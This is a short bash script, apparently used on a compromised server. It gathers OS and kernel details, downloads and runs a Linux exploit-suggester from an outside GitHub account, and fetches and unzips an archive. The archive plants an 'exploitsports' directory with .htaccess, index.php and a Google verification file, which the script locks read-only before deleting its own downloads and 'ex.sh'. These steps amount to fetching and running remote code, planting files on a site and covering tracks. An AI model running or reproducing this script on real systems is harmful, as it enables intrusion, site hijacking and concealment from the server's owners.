#!/bin/bash
cat /etc/os-release
uname -a
wget https://raw.githubusercontent.com/sniper404ghostxploit/LINUX-EXPLOIT-SUGESTER/master/linux-exploit-suggester.sh -O xploit.sh
chmod +x xploit.sh
./xploit.sh
wget https://raw.githubusercontent.com/sniper404ghostxploit/var/main/x.zip
unzip x.zip
chmod 555 exploitsports/.htaccess
chmod 555 exploitsports/index.php
chmod 555 exploitsports/google919ca1aa9a28b4ac.html
rm xploit.sh
rm x.zip
rm ex.sh
